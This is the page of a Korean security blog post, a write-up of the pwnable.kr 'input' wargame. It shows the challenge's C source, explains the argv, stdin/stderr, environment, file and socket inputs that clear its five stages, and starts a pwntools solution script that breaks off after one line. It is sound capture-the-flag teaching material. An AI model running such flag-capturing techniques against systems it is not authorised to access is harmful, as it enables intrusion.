@@ -1,0 +1,735 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='문제를 접속하면 아래의 파일이 주어진다. 우선 c파일을 열어보자. 열어보면 총 5개의 stage를 넘어가야하는데. 입력값을 코드에 맞춰 넘겨주면 된다. 각 스테'><title>pwnable.kr input</title>
+
+<link rel='canonical' href='https://appealso.github.io/p/pwnable.kr-input/'>
+
+<link rel="stylesheet" href="/scss/style.min.775dbd4fd34fda61c5273b4bc3415f7c9666414fb6c40aab164a7ded4397da98.css">
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<meta name="naver-site-verification" content="66737462d26ac026782cf58694d2b5efcf6ed19f" />
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-J2H7Y6XC3K');
+</script><meta property='og:title' content='pwnable.kr input'>
+<meta property='og:description' content='문제를 접속하면 아래의 파일이 주어진다. 우선 c파일을 열어보자. 열어보면 총 5개의 stage를 넘어가야하는데. 입력값을 코드에 맞춰 넘겨주면 된다. 각 스테'>
+<meta property='og:url' content='https://appealso.github.io/p/pwnable.kr-input/'>
+<meta property='og:site_name' content='SooHo&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='pwnable.kr' /><meta property='article:tag' content='pwn' /><meta property='article:tag' content='Wargame' /><meta property='article:published_time' content='2022-10-26T17:08:44&#43;09:00'/><meta property='article:modified_time' content='2022-10-26T17:08:44&#43;09:00'/><meta property='og:image' content='https://appealso.github.io/p/pwnable.kr-input/pwn.png' />
+<meta name="twitter:title" content="pwnable.kr input">
+<meta name="twitter:description" content="문제를 접속하면 아래의 파일이 주어진다. 우선 c파일을 열어보자. 열어보면 총 5개의 stage를 넘어가야하는데. 입력값을 코드에 맞춰 넘겨주면 된다. 각 스테"><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://appealso.github.io/p/pwnable.kr-input/pwn.png' />
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-J2H7Y6XC3K"></script>
+<script>
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.dataLayer = window.dataLayer || [];
+	function gtag(){dataLayer.push(arguments);}
+	gtag('js', new Date());
+	gtag('config', 'G-J2H7Y6XC3K', { 'anonymize_ip': false });
+}
+</script>
+
+    </head>
+    <body class="
+    article-page 
+">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            localStorage.setItem(colorSchemeKey, "light");
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex 
+    
+        on-phone--column extended
+    
+">
+    
+        <aside class="sidebar left-sidebar sticky">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header class="site-info">
+        
+            
+            <figure class="site-avatar">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/IMG_hu741e5fcc8a8371ad3c512c4eac4a27a6_49324_300x0_resize_q75_box.JPG" width="300"
+                            height="353" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+
+                
+            </figure>
+            
+        
+        
+        <h1 class="site-name"><a href="/">SooHo&#39;s Blog</a></h1>
+        <h2 class="site-description">Security engineer and Developer</h2></header>
+
+    <ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        
+    </ol>
+</aside>
+
+    
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/pwnable.kr-input/">
+                <img src="/p/pwnable.kr-input/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_800x0_resize_box_3.png"
+                        srcset="/p/pwnable.kr-input/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_800x0_resize_box_3.png 800w, /p/pwnable.kr-input/pwn_hu894f602aab8ef4f7b7afefcfbc650dba_71661_1600x0_resize_box_3.png 1600w"
+                        width="800" 
+                        height="142" 
+                        loading="lazy"
+                        alt="Featured image of post pwnable.kr input" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/wargame/" style="background-color: #2a9d8f; color: #fff;">
+                Wargame
+            </a>
+        
+    </header>
+    
+
+    <h2 class="article-title">
+        <a href="/p/pwnable.kr-input/">pwnable.kr input</a>
+    </h2>
+
+    
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Oct 26, 2022</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    2 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+</div>
+</header>
+
+    <section class="article-content">
+    <p>문제를 접속하면 아래의 파일이 주어진다. 우선 c파일을 열어보자.
+열어보면 총 5개의 stage를 넘어가야하는데. 입력값을 코드에 맞춰 넘겨주면 된다. 각 스테이지 별로 분석을 해보자.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">input2</span><span class="err">@</span><span class="nl">pwnable</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ls</span>
+<span class="n">flag</span>  <span class="n">input</span>  <span class="n">input</span><span class="p">.</span><span class="n">c</span>
+<span class="n">input2</span><span class="err">@</span><span class="nl">pwnable</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="n">input</span><span class="p">.</span><span class="n">c</span>
+<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;sys/socket.h&gt;</span><span class="cp">
+</span><span class="cp">#include</span> <span class="cpf">&lt;arpa/inet.h&gt;</span><span class="cp">
+</span><span class="cp"></span>
+<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[],</span> <span class="kt">char</span><span class="o">*</span> <span class="n">envp</span><span class="p">[]){</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Welcome to pwnable.kr</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Let&#39;s see if you know how to give input to program</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Just give me correct inputs then you will get the flag :)</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// argv
+</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 1 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// stdio
+</span><span class="c1"></span>	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 2 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// env
+</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 3 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// file
+</span><span class="c1"></span>	<span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 4 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// network
+</span><span class="c1"></span>	<span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
+	<span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">])</span> <span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;bind error, use another port</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
+	<span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;accept error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 5 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+
+	<span class="c1">// here&#39;s your flag
+</span><span class="c1"></span>	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/bin/cat flag&#34;</span><span class="p">);</span>
+	<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div><p>우선 stage1 을 보면 아래와 같다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">	<span class="c1">// argv
+</span><span class="c1"></span>	<span class="k">if</span><span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">100</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;A&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x00</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;B&#39;</span><span class="p">],</span><span class="s">&#34;</span><span class="se">\x20\x0a\x0d</span><span class="s">&#34;</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 1 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></div><p>인자가 100개이고, A,B번째 인자가 &ldquo;\x00&rdquo;, &ldquo;\x20\x0a\x0d&rdquo; 이어야한다.</p>
+<p>다음으로 stage2를 보면 다음과 같다.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">	<span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">4</span><span class="p">];</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x00\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">read</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">);</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x0a\x02\xff</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 2 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></div><p>stdin에서 4바이트를 읽어와서 내용이 \x00\x0a\x00\xff인지 확인하고 stderr에서 4바이트를 읽어와서 내용이 \x00\x0a\x02\xff이어야 한다.</p>
+<p>다음으로 stage3을 보자.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c">	<span class="k">if</span><span class="p">(</span><span class="n">strcmp</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xca\xfe\xba\xbe</span><span class="s">&#34;</span><span class="p">,</span> <span class="n">getenv</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">)))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 3 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></div><p>환경변수의 값을 \xca\xfe\xba\xbe로 지정해야한다.</p>
+<p>다음으로 stage4를 보자.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="n">FILE</span><span class="o">*</span> <span class="n">fp</span> <span class="o">=</span> <span class="n">fopen</span><span class="p">(</span><span class="s">&#34;</span><span class="se">\x0a</span><span class="s">&#34;</span><span class="p">,</span> <span class="s">&#34;r&#34;</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="n">fp</span><span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">fread</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="n">fp</span><span class="p">)</span><span class="o">!=</span><span class="mi">1</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\x00\x00\x00\x00</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">)</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">fclose</span><span class="p">(</span><span class="n">fp</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 4 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></div><p>\x0a라는 파일에 4방비트를 \x00으로 채워야 한다.</p>
+<p>마지막으로 stage5를 보자</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="kt">int</span> <span class="n">sd</span><span class="p">,</span> <span class="n">cd</span><span class="p">;</span>
+	<span class="k">struct</span> <span class="n">sockaddr_in</span> <span class="n">saddr</span><span class="p">,</span> <span class="n">caddr</span><span class="p">;</span>
+	<span class="n">sd</span> <span class="o">=</span> <span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">sd</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;socket error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_family</span> <span class="o">=</span> <span class="n">AF_INET</span><span class="p">;</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_addr</span><span class="p">.</span><span class="n">s_addr</span> <span class="o">=</span> <span class="n">INADDR_ANY</span><span class="p">;</span>
+	<span class="n">saddr</span><span class="p">.</span><span class="n">sin_port</span> <span class="o">=</span> <span class="n">htons</span><span class="p">(</span> <span class="n">atoi</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="sc">&#39;C&#39;</span><span class="p">])</span> <span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">bind</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">saddr</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">saddr</span><span class="p">))</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;bind error, use another port</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+    		<span class="k">return</span> <span class="mi">1</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="n">listen</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
+	<span class="kt">int</span> <span class="n">c</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr_in</span><span class="p">);</span>
+	<span class="n">cd</span> <span class="o">=</span> <span class="n">accept</span><span class="p">(</span><span class="n">sd</span><span class="p">,</span> <span class="p">(</span><span class="k">struct</span> <span class="n">sockaddr</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">caddr</span><span class="p">,</span> <span class="p">(</span><span class="n">socklen_t</span><span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">c</span><span class="p">);</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">cd</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">){</span>
+		<span class="n">printf</span><span class="p">(</span><span class="s">&#34;accept error, tell admin</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span><span class="p">(</span> <span class="n">recv</span><span class="p">(</span><span class="n">cd</span><span class="p">,</span> <span class="n">buf</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">4</span> <span class="p">)</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="k">if</span><span class="p">(</span><span class="n">memcmp</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="s">&#34;</span><span class="se">\xde\xad\xbe\xef</span><span class="s">&#34;</span><span class="p">,</span> <span class="mi">4</span><span class="p">))</span> <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Stage 5 clear!</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</code></pre></div><p>해당 코드를 해석해 보면 argv[&lsquo;C&rsquo;]에서 포트를 주고, \xde\xad\xbe\xef를 입력하면 되는 것을 알 수 있다.
+이제 이걸 모아서 아래와 같은 exploit코드를 작성하고 실행 해주면 flag를 획득 할 수 있다.</p>
+<ul>
+<li>flag파일이 없기 때문에 &lsquo;ln -s /home/input2/flag flag&rsquo; 실행하여 링크 파일을 만들어 주어야 한다.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">argv_ans</span> <span class="o">=</span> <span class="p">[</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">100</span><span class="p">)]</span>
